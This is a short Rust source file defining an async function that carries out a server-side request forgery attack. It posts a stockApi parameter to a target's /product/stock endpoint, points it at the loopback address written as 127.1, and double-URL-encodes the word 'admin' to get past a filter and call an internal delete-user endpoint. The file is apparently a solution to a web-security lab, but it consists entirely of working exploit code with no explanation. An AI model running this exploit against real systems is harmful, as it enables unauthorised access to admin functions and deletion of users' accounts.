use reqwest::header::{HeaderMap, HeaderValue};

pub async fn delete_user(url: &str, name: &str) -> Result<(), Box<dyn std::error::Error>> {
    let client = reqwest::Client::new();

    let payload = format!("stockApi=http://127.1/%2561%2564%256d%2569%256e/delete?username={}", name);

    let mut headers = HeaderMap::new();
    headers.insert("Content-Type", HeaderValue::from_static("application/x-www-form-urlencoded"));
let request = client .post(format!("{}/product/stock",url))
        .headers(headers)
        .body(payload)
        .build()?;

    let _ = client.execute(request).await?;
    Ok(())
}
